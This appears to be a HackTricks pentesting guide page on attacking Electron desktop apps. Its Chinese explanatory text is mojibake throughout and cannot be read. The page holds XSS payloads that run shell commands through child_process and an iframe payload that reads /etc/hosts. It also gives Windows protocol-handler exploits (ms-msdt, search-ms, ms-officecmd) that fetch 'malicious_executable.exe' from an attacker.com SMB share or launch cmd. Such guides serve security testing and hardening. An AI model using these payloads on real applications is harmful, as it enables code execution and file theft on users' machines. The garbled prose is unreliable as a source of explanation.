<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Electron Desktop Apps</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="electron-desktop-apps"><a class="header" href="#electron-desktop-apps">Electron Desktop Apps</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="ä»‹ç»"><a class="header" href="#ä»‹ç»">ä»‹ç»</a></h2>
<p>Electron ç»“åˆäº†æœ¬åœ°åç«¯ï¼ˆä½¿ç”¨ <strong>NodeJS</strong>ï¼‰å’Œå‰ç«¯ï¼ˆ<strong>Chromium</strong>ï¼‰ï¼Œå°½ç®¡å®ƒç¼ºä¹ç°ä»£æµè§ˆå™¨çš„ä¸€äº›å®‰å…¨æœºåˆ¶ã€‚</p>
<p>é€šå¸¸ä½ å¯èƒ½ä¼šåœ¨ <code>.asar</code> åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ° Electron åº”ç”¨ä»£ç ï¼Œè·å–ä»£ç éœ€è¦æå–å®ƒï¼š</p>
<pre><code class="language-bash">npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
</code></pre>
<p>åœ¨ Electron åº”ç”¨çš„æºä»£ç ä¸­ï¼Œåœ¨ <code>packet.json</code> æ–‡ä»¶å†…ï¼Œå¯ä»¥æ‰¾åˆ°æŒ‡å®šçš„ <code>main.js</code> æ–‡ä»¶ï¼Œå…¶ä¸­è®¾ç½®äº†å®‰å…¨é…ç½®ã€‚</p>
<pre><code class="language-json">{
"name": "standard-notes",
"main": "./app/index.js",
</code></pre>
<p>Electron æœ‰ 2 ç§è¿›ç¨‹ç±»å‹ï¼š</p>
<ul>
<li>ä¸»è¿›ç¨‹ï¼ˆå®Œå…¨è®¿é—® NodeJSï¼‰</li>
<li>æ¸²æŸ“è¿›ç¨‹ï¼ˆå‡ºäºå®‰å…¨åŸå› ï¼ŒNodeJS åº”è¯¥å—åˆ°é™åˆ¶è®¿é—®ï¼‰</li>
</ul>
<p><img src="../../../.gitbook/assets/image%20(182).png" alt="" /></p>
<p>ä¸€ä¸ª <strong>æ¸²æŸ“è¿›ç¨‹</strong> å°†æ˜¯ä¸€ä¸ªåŠ è½½æ–‡ä»¶çš„æµè§ˆå™¨çª—å£ï¼š</p>
<pre><code class="language-javascript">const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
</code></pre>
<p>è®¾ç½® <strong>renderer process</strong> å¯ä»¥åœ¨ <strong>main process</strong> çš„ main.js æ–‡ä»¶ä¸­ <strong>é…ç½®</strong>ã€‚ä¸€äº›é…ç½®å°† <strong>é˜²æ­¢ Electron åº”ç”¨ç¨‹åºè·å¾— RCE</strong> æˆ–å…¶ä»–æ¼æ´ï¼Œå¦‚æœ <strong>è®¾ç½®æ­£ç¡®é…ç½®</strong>ã€‚</p>
<p>Electron åº”ç”¨ç¨‹åº <strong>å¯ä»¥é€šè¿‡ Node API è®¿é—®è®¾å¤‡</strong>ï¼Œå°½ç®¡å¯ä»¥é…ç½®ä»¥é˜²æ­¢å®ƒï¼š</p>
<ul>
<li><strong><code>nodeIntegration</code></strong> - é»˜è®¤æƒ…å†µä¸‹ä¸º <code>off</code>ã€‚å¦‚æœå¼€å¯ï¼Œå…è®¸ä» renderer process è®¿é—® Node ç‰¹æ€§ã€‚</li>
<li><strong><code>contextIsolation</code></strong> - é»˜è®¤æƒ…å†µä¸‹ä¸º <code>on</code>ã€‚å¦‚æœå…³é—­ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¸è¢«éš”ç¦»ã€‚</li>
<li><strong><code>preload</code></strong> - é»˜è®¤æƒ…å†µä¸‹ä¸ºç©ºã€‚</li>
<li><a href="https://docs.w3cub.com/electron/api/sandbox-option"><strong><code>sandbox</code></strong></a> - é»˜è®¤æƒ…å†µä¸‹ä¸º offã€‚å®ƒå°†é™åˆ¶ NodeJS å¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚</li>
<li>å·¥ä½œçº¿ç¨‹ä¸­çš„ Node é›†æˆ</li>
<li><strong><code>nodeIntegrationInSubframes</code></strong> - é»˜è®¤æƒ…å†µä¸‹ä¸º <code>off</code>ã€‚</li>
<li>å¦‚æœ <strong><code>nodeIntegration</code></strong> è¢« <strong>å¯ç”¨</strong>ï¼Œè¿™å°†å…è®¸åœ¨ Electron åº”ç”¨ç¨‹åºä¸­ <strong>åŠ è½½åœ¨ iframe ä¸­çš„ç½‘é¡µ</strong> ä½¿ç”¨ <strong>Node.js API</strong>ã€‚</li>
<li>å¦‚æœ <strong><code>nodeIntegration</code></strong> è¢« <strong>ç¦ç”¨</strong>ï¼Œåˆ™é¢„åŠ è½½å°†åœ¨ iframe ä¸­åŠ è½½ã€‚</li>
</ul>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="language-javascript">const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
</code></pre>
<p>ä¸€äº› <strong>RCE payloads</strong> æ¥è‡ª <a href="https://7as.es/electron/nodeIntegration_rce.txt">è¿™é‡Œ</a>:</p>
<pre><code class="language-html">Example Payloads (Windows):
&lt;img src=x onerror="alert(require('child_process').execSync('calc').toString());"&gt;

Example Payloads (Linux &amp; MacOS):
&lt;img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('id').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('ls -l').toString());"&gt;
&lt;img src=x onerror="alert(require('child_process').execSync('uname -a').toString());"&gt;
</code></pre>
<h3 id="æ•è·æµé‡"><a class="header" href="#æ•è·æµé‡">æ•è·æµé‡</a></h3>
<p>ä¿®æ”¹ start-main é…ç½®å¹¶æ·»åŠ ä½¿ç”¨ä»£ç†ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-javascript">"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
</code></pre>
<h2 id="electron-æœ¬åœ°ä»£ç æ³¨å…¥"><a class="header" href="#electron-æœ¬åœ°ä»£ç æ³¨å…¥">Electron æœ¬åœ°ä»£ç æ³¨å…¥</a></h2>
<p>å¦‚æœæ‚¨å¯ä»¥æœ¬åœ°æ‰§è¡Œä¸€ä¸ª Electron åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½å¯ä»¥ä½¿å…¶æ‰§è¡Œä»»æ„çš„ JavaScript ä»£ç ã€‚è¯·æŸ¥çœ‹å¦‚ä½•æ“ä½œï¼š</p>
<p>{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
<a href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.html">macos-electron-applications-injection.md</a>
{% endcontent-ref %}</p>
<h2 id="rce-xss--nodeintegration"><a class="header" href="#rce-xss--nodeintegration">RCE: XSS + nodeIntegration</a></h2>
<p>å¦‚æœ <strong>nodeIntegration</strong> è®¾ç½®ä¸º <strong>on</strong>ï¼Œç½‘é¡µçš„ JavaScript å¯ä»¥è½»æ¾ä½¿ç”¨ Node.js åŠŸèƒ½ï¼Œåªéœ€è°ƒç”¨ <code>require()</code>ã€‚ä¾‹å¦‚ï¼Œåœ¨ Windows ä¸Šæ‰§è¡Œè®¡ç®—å™¨åº”ç”¨ç¨‹åºçš„æ–¹æ³•æ˜¯ï¼š</p>
<pre><code class="language-html">&lt;script&gt;
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
&lt;/script&gt;
</code></pre>
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>
<h2 id="rce-preload"><a class="header" href="#rce-preload">RCE: preload</a></h2>
<p>åœ¨æ­¤è®¾ç½®ä¸­æŒ‡ç¤ºçš„è„šæœ¬æ˜¯åœ¨æ¸²æŸ“å™¨ä¸­<strong>åŠ è½½å…¶ä»–è„šæœ¬ä¹‹å‰</strong>ï¼Œå› æ­¤å®ƒå…·æœ‰<strong>å¯¹ Node API çš„æ— é™è®¿é—®æƒé™</strong>ï¼š</p>
<pre><code class="language-javascript">new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
</code></pre>
<p>å› æ­¤ï¼Œè„šæœ¬å¯ä»¥å°† node-features å¯¼å‡ºåˆ°é¡µé¢ï¼š</p>
<p>{% code title="preload.js" %}</p>
<pre><code class="language-javascript">typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
</code></pre>
<p>{% endcode %}</p>
<p>{% code title="index.html" %}</p>
<pre><code class="language-html">&lt;body&gt;
&lt;script&gt;
typeof require === 'undefined';
runCalc();
&lt;/script&gt;
&lt;/body&gt;
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="info" %}
<strong>å¦‚æœ <code>contextIsolation</code> å¼€å¯ï¼Œè¿™å°†ä¸èµ·ä½œç”¨</strong>
{% endhint %}</p>
<h2 id="rce-xss--contextisolation"><a class="header" href="#rce-xss--contextisolation">RCE: XSS + contextIsolation</a></h2>
<p><em><strong>contextIsolation</strong></em> å¼•å…¥äº† <strong>ç½‘é¡µè„šæœ¬ä¸ JavaScript Electron å†…éƒ¨ä»£ç ä¹‹é—´çš„åˆ†ç¦»ä¸Šä¸‹æ–‡</strong>ï¼Œä½¿å¾—æ¯æ®µä»£ç çš„ JavaScript æ‰§è¡Œä¸ä¼šç›¸äº’å½±å“ã€‚è¿™æ˜¯æ¶ˆé™¤ RCE å¯èƒ½æ€§çš„å¿…è¦ç‰¹æ€§ã€‚</p>
<p>å¦‚æœä¸Šä¸‹æ–‡æ²¡æœ‰è¢«éš”ç¦»ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š</p>
<ol>
<li>åœ¨æ¸²æŸ“å™¨ä¸­æ‰§è¡Œ <strong>ä»»æ„ JavaScript</strong>ï¼ˆXSS æˆ–å¯¼èˆªåˆ°å¤–éƒ¨ç½‘ç«™ï¼‰</li>
<li><strong>è¦†ç›–å†…ç½®æ–¹æ³•</strong>ï¼Œè¯¥æ–¹æ³•ç”¨äºé¢„åŠ è½½æˆ– Electron å†…éƒ¨ä»£ç ï¼Œæ›¿æ¢ä¸ºè‡ªå·±çš„å‡½æ•°</li>
<li><strong>è§¦å‘</strong> ä½¿ç”¨ <strong>è¢«è¦†ç›–çš„å‡½æ•°</strong></li>
<li>RCEï¼Ÿ</li>
</ol>
<p>å†…ç½®æ–¹æ³•å¯ä»¥è¢«è¦†ç›–çš„åœ°æ–¹æœ‰ä¸¤ä¸ªï¼šåœ¨é¢„åŠ è½½ä»£ç ä¸­æˆ–åœ¨ Electron å†…éƒ¨ä»£ç ä¸­ï¼š</p>
<p>{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
<a href="electron-contextisolation-rce-via-preload-code.html">electron-contextisolation-rce-via-preload-code.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
<a href="electron-contextisolation-rce-via-electron-internal-code.html">electron-contextisolation-rce-via-electron-internal-code.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
<a href="electron-contextisolation-rce-via-ipc.html">electron-contextisolation-rce-via-ipc.md</a>
{% endcontent-ref %}</p>
<h3 id="ç»•è¿‡ç‚¹å‡»äº‹ä»¶"><a class="header" href="#ç»•è¿‡ç‚¹å‡»äº‹ä»¶">ç»•è¿‡ç‚¹å‡»äº‹ä»¶</a></h3>
<p>å¦‚æœåœ¨ç‚¹å‡»é“¾æ¥æ—¶æœ‰é™åˆ¶ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡ <strong>ä¸­é—´ç‚¹å‡»</strong> è€Œä¸æ˜¯å¸¸è§„çš„å·¦é”®ç‚¹å‡»æ¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚</p>
<pre><code class="language-javascript">window.addEventListener('click', (e) =&gt; {
</code></pre>
<h2 id="rce-via-shellopenexternal"><a class="header" href="#rce-via-shellopenexternal">RCE via shell.openExternal</a></h2>
<p>æœ‰å…³æ­¤ç¤ºä¾‹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8">https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8</a> å’Œ <a href="https://benjamin-altpeter.de/shell-openexternal-dangers/">https://benjamin-altpeter.de/shell-openexternal-dangers/</a></p>
<p>åœ¨éƒ¨ç½² Electron æ¡Œé¢åº”ç”¨ç¨‹åºæ—¶ï¼Œç¡®ä¿ <code>nodeIntegration</code> å’Œ <code>contextIsolation</code> çš„æ­£ç¡®è®¾ç½®è‡³å…³é‡è¦ã€‚å·²ç¡®å®šï¼Œ<strong>é’ˆå¯¹é¢„åŠ è½½è„šæœ¬æˆ– Electron çš„ä¸»è¿›ç¨‹æœ¬æœºä»£ç çš„å®¢æˆ·ç«¯è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)</strong> åœ¨è¿™äº›è®¾ç½®åˆ°ä½æ—¶å¾—åˆ°äº†æœ‰æ•ˆé˜²æ­¢ã€‚</p>
<p>å½“ç”¨æˆ·ä¸é“¾æ¥äº’åŠ¨æˆ–æ‰“å¼€æ–°çª—å£æ—¶ï¼Œä¼šè§¦å‘ç‰¹å®šçš„äº‹ä»¶ç›‘å¬å™¨ï¼Œè¿™å¯¹åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’ŒåŠŸèƒ½è‡³å…³é‡è¦ï¼š</p>
<pre><code class="language-javascript">webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
</code></pre>
<p>è¿™äº›ç›‘å¬å™¨è¢«<strong>æ¡Œé¢åº”ç”¨ç¨‹åºé‡å†™</strong>ä»¥å®ç°å…¶è‡ªå·±çš„<strong>ä¸šåŠ¡é€»è¾‘</strong>ã€‚åº”ç”¨ç¨‹åºè¯„ä¼°å¯¼èˆªé“¾æ¥æ˜¯å¦åº”è¯¥åœ¨å†…éƒ¨æ‰“å¼€æˆ–åœ¨å¤–éƒ¨ç½‘é¡µæµè§ˆå™¨ä¸­æ‰“å¼€ã€‚è¿™ä¸ªå†³å®šé€šå¸¸é€šè¿‡ä¸€ä¸ªå‡½æ•°<code>openInternally</code>æ¥åšã€‚å¦‚æœè¿™ä¸ªå‡½æ•°è¿”å›<code>false</code>ï¼Œåˆ™è¡¨ç¤ºé“¾æ¥åº”è¯¥åœ¨å¤–éƒ¨æ‰“å¼€ï¼Œåˆ©ç”¨<code>shell.openExternal</code>å‡½æ•°ã€‚</p>
<p><strong>ä»¥ä¸‹æ˜¯ç®€åŒ–çš„ä¼ªä»£ç ï¼š</strong></p>
<p><img src="../../../.gitbook/assets/image%20(261).png" alt="https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png" /></p>
<p><img src="../../../.gitbook/assets/image%20(963).png" alt="https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png" /></p>
<p>Electron JSå®‰å…¨æœ€ä½³å®è·µå»ºè®®ä¸è¦ä½¿ç”¨<code>openExternal</code>å‡½æ•°æ¥å—ä¸å—ä¿¡ä»»çš„å†…å®¹ï¼Œå› ä¸ºè¿™å¯èƒ½é€šè¿‡å„ç§åè®®å¯¼è‡´RCEã€‚æ“ä½œç³»ç»Ÿæ”¯æŒä¸åŒçš„åè®®ï¼Œè¿™äº›åè®®å¯èƒ½è§¦å‘RCEã€‚æœ‰å…³æ­¤ä¸»é¢˜çš„è¯¦ç»†ç¤ºä¾‹å’Œè¿›ä¸€æ­¥è§£é‡Šï¼Œå¯ä»¥å‚è€ƒ<a href="https://positive.security/blog/url-open-rce#windows-10-19042">è¿™ä¸ªèµ„æº</a>ï¼Œå…¶ä¸­åŒ…æ‹¬èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´çš„Windowsåè®®ç¤ºä¾‹ã€‚</p>
<p><strong>Windowsåè®®åˆ©ç”¨çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š</strong></p>
<pre><code class="language-html">&lt;script&gt;
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
&lt;/script&gt;

&lt;script&gt;
window.open("search-ms:query=malicious_executable.exe&amp;crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&amp;displayname=Important%20update")
&lt;/script&gt;

&lt;script&gt;
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&amp;&amp;%2520%22%22%7D%7D")
&lt;/script&gt;
</code></pre>
<h2 id="è¯»å–å†…éƒ¨æ–‡ä»¶xss--contextisolation"><a class="header" href="#è¯»å–å†…éƒ¨æ–‡ä»¶xss--contextisolation">è¯»å–å†…éƒ¨æ–‡ä»¶ï¼šXSS + contextIsolation</a></h2>
<p><strong>ç¦ç”¨ <code>contextIsolation</code> ä½¿å¾—å¯ä»¥ä½¿ç”¨ <code>&lt;webview&gt;</code> æ ‡ç­¾</strong>ï¼Œç±»ä¼¼äº <code>&lt;iframe&gt;</code>ï¼Œç”¨äºè¯»å–å’Œæå–æœ¬åœ°æ–‡ä»¶ã€‚æä¾›çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´è¯»å–å†…éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼š</p>
<p><img src="../../../.gitbook/assets/1%20u1jdRYuWAEVwJmf_F2ttJg%20(1).png" alt="" /></p>
<p>æ­¤å¤–ï¼Œè¿˜åˆ†äº«äº†å¦ä¸€ç§<strong>è¯»å–å†…éƒ¨æ–‡ä»¶</strong>çš„æ–¹æ³•ï¼Œå¼ºè°ƒäº† Electron æ¡Œé¢åº”ç”¨ä¸­çš„ä¸€ä¸ªå…³é”®æœ¬åœ°æ–‡ä»¶è¯»å–æ¼æ´ã€‚è¿™æ¶‰åŠæ³¨å…¥è„šæœ¬ä»¥åˆ©ç”¨è¯¥åº”ç”¨å¹¶æå–æ•°æ®ï¼š</p>
<pre><code class="language-html">&lt;br&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;
&lt;h1&gt;pwn&lt;br&gt;
&lt;iframe onload=j() src="/etc/hosts"&gt;xssxsxxsxs&lt;/iframe&gt;
&lt;script type="text/javascript"&gt;
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
&lt;/script&gt;
</code></pre>
<h2 id="rce-xss--æ—§ç‰ˆ-chromium"><a class="header" href="#rce-xss--æ—§ç‰ˆ-chromium"><strong>RCE: XSS + æ—§ç‰ˆ Chromium</strong></a></h2>
<p>å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨çš„ <strong>chromium</strong> æ˜¯ <strong>æ—§ç‰ˆ</strong> å¹¶ä¸”å­˜åœ¨ <strong>å·²çŸ¥çš„</strong> <strong>æ¼æ´</strong>ï¼Œé‚£ä¹ˆå¯èƒ½é€šè¿‡ <strong>XSS åˆ©ç”¨å®ƒå¹¶è·å¾— RCE</strong>ã€‚<br />
æ‚¨å¯ä»¥åœ¨è¿™ä¸ª <strong>writeup</strong> ä¸­çœ‹åˆ°ä¸€ä¸ªä¾‹å­: <a href="https://blog.electrovolt.io/posts/discord-rce/">https://blog.electrovolt.io/posts/discord-rce/</a></p>
<h2 id="é€šè¿‡å†…éƒ¨-url-æ­£åˆ™ç»•è¿‡è¿›è¡Œ-xss-é’“é±¼"><a class="header" href="#é€šè¿‡å†…éƒ¨-url-æ­£åˆ™ç»•è¿‡è¿›è¡Œ-xss-é’“é±¼"><strong>é€šè¿‡å†…éƒ¨ URL æ­£åˆ™ç»•è¿‡è¿›è¡Œ XSS é’“é±¼</strong></a></h2>
<p>å‡è®¾æ‚¨å‘ç°äº†ä¸€ä¸ª XSSï¼Œä½†æ‚¨ <strong>æ— æ³•è§¦å‘ RCE æˆ–çªƒå–å†…éƒ¨æ–‡ä»¶</strong>ï¼Œæ‚¨å¯ä»¥å°è¯•åˆ©ç”¨å®ƒæ¥ <strong>é€šè¿‡é’“é±¼çªƒå–å‡­æ®</strong>ã€‚</p>
<p>é¦–å…ˆï¼Œæ‚¨éœ€è¦äº†è§£å½“æ‚¨å°è¯•æ‰“å¼€ä¸€ä¸ªæ–° URL æ—¶ï¼Œå‰ç«¯çš„ JS ä»£ç ä¼šå‘ç”Ÿä»€ä¹ˆ:</p>
<pre><code class="language-javascript">webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
</code></pre>
<p>è°ƒç”¨ <strong><code>openInternally</code></strong> å°†å†³å®š <strong>é“¾æ¥</strong> æ˜¯å¦åœ¨ <strong>æ¡Œé¢çª—å£</strong> ä¸­ <strong>æ‰“å¼€</strong>ï¼Œå› ä¸ºå®ƒæ˜¯å±äºå¹³å°çš„é“¾æ¥ï¼Œ<strong>æˆ–è€…</strong> æ˜¯å¦åœ¨ <strong>æµè§ˆå™¨ä¸­ä½œä¸ºç¬¬ä¸‰æ–¹èµ„æº</strong> æ‰“å¼€ã€‚</p>
